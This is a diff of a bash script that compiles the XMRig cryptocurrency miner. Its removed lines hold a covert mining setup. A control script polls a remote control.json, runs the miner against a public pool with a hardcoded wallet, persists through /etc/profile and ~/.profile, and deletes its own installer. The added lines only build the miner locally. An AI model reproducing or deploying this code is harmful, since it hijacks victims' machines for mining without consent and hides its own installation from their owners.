@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # Step 1: Install dependencies for compiling xmrig
-echo "Installing dependencies..."
+sudo echo "Installing dependencies..."
 sudo apt update
 sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev jq curl
 
@@ -15,67 +15,7 @@ echo "Compiling XMRig..."
 mkdir build
 cd build
 cmake ..
-make -j$(nproc)
-sudo cp xmrig /usr/local/bin
-# Step 4: Define the mining command with 2 cores and a random rig ID
-rig_id=$(hostname)_$(date +%s)  # Generates a random rig ID based on hostname and timestamp
-miner_path="/usr/local/bin/xmrig"
-control_json_url="https://crowlingsppider.github.io/miner-control/control.json"  # Replace <your-username> with your actual GitHub username
-
-# Step 5: Create a control script that adjusts mining parameters dynamically
-echo "Creating control script..."
-cat > ~/control_miner.sh << EOL
-#!/bin/bash
-
-# Function to fetch control.json from GitHub Pages
-fetch_control_params() {
-    curl -s $control_json_url -o control.json
-    threads=\$(jq '.threads' control.json)
-    mining=\$(jq '.mining' control.json)
-}
-
-# Main loop to control mining
-while true; do
-    fetch_control_params  # Get updated control parameters from GitHub
-
-    if [ "\$mining" = "true" ]; then
-        # If mining is true, ensure the miner is running with the correct thread count
-        if ! pgrep xmrig > /dev/null; then
-            echo "Starting miner with \$threads threads..."
-            $miner_path --threads 2 -o pool.supportxmr.com:3333 -u 47DH5d5rJmy1Z56CMKrXhE4hCW1ZMkqxu4mbvAX83PRfiU6RLXp7cyr9BHo1jjnRL6RD85oBA9JjjSZwaxspRQDwVszK5eq -p "$rig_id" &
-        else
-            # If miner is already running, adjust the thread count if necessary
-            current_threads=\$(pgrep -a xmrig | awk '{print \$4}')
-            if [ "\$current_threads" != "\$threads" ]; then
-                echo "Adjusting miner to use \$threads threads..."
-                pkill xmrig
-                $miner_path --threads 2 -o pool.supportxmr.com:3333 -u 47DH5d5rJmy1Z56CMKrXhE4hCW1ZMkqxu4mbvAX83PRfiU6RLXp7cyr9BHo1jjnRL6RD85oBA9JjjSZwaxspRQDwVszK5eq -p "$rig_id" &
-            fi
-        fi
-    else
-        # If mining is false, stop the miner if it's running
-        if pgrep xmrig > /dev/null; then
-            echo "Stopping miner..."
-            pkill xmrig
-        fi
-    fi
-
-    # Wait 1 minute before checking again
-    sleep 60
-done
-EOL
-
-# Step 6: Make the script executable
-chmod +x ~/control_miner.sh
-
-# Step 7: Add the control script to ~/.profile for auto-run on login
-echo "Adding control script to ~/.profile for auto-run on login..."
-sudo echo "bash ~/control_miner.sh &" >> /etc/profile
-sudo echo "bash ~/control_miner.sh &" >> /home/$(whoami)/.profile
-
-# Step 8: Self-remove the installer script
-echo "Self-removing the installation script..."
-rm -- "$0"
-
-# Final message
-echo "Installation complete. The miner will start on login and adjust based on control.json in your GitHub repository."
+make
+mkdir ../../miner
+cp xmrig ../../miner
+cd ../../miner
